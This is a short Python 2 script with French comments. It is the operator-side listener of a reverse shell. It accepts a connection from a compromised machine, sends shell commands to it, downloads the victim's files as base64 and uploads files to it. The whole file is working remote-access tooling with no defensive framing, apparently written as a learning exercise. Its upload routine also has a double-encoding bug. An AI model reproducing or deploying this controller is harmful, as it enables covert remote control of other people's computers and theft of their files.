#!usr/bin/python

import socket
import json
import base64

localIP = "192.168.1.27"
portbind = 51234

def reliable_send(data): #pour envoyer plus de 1024 bits
	json_data = json.dumps(data, ensure_ascii=False)
	target.send(json_data)

def reliable_recv():
	data = "" #empty
	while True:
		try:
			data = data + target.recv(1024)
			#print "data recv"
			#print data.decode('utf-8','ignore')
			#print "json.loads(data)"
			#print json.loads(data.decode('utf-8','ignore'))
			return json.loads(data.decode('utf-8','ignore')) #une fois que c bon y a tout dans data
		except ValueError:
			continue #si on recoit plus de 1024 on continue

def shell():
	while True:
		command = raw_input("* Shell#~%s: " %str(ip))
		reliable_send(command)
		if command == 'q':
			break
		elif command[:2] == "cd" and len(command) > 1: #on attend pas de retour
			continue
		elif command[:8] == "download":
			with open(command[9:],"wb") as file: #on open the file to write bytes
				file_data = reliable_recv() #on recv la data dans file_data
				file.write(base64.b64decode(file_data)) #on write la data decodee
		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as fin: #read bytes
					print "upload send"
					send = base64.b64encode(fin.read())
					print send
					print "decode"
					print base64.b64decode(send)
					reliable_send(base64.b64encode(send))
			except:
				failed = "Failed to upload"
				reliable_send(base64.b64encode(failed))
		else:
			result = reliable_recv()
			#print "result"
			print(result)

def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #ipv4 connection ; TCP connection
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #options pour le sokcet object

	s.bind((localIP,portbind)) #ca va bind notre ip addresse locale vers le port specifie entre (), veririfer que le port n'est pas utilise
	s.listen(5) #listen for incomming connexions, entre () le nombre

	print("[+] Listening for incoming connections")

	target, ip = s.accept() #on stocke la connexion, socket obj in target, ip stocke ip et port
	print("[+] Connection established from: %s" % str(ip))

server()
shell()
s.close()
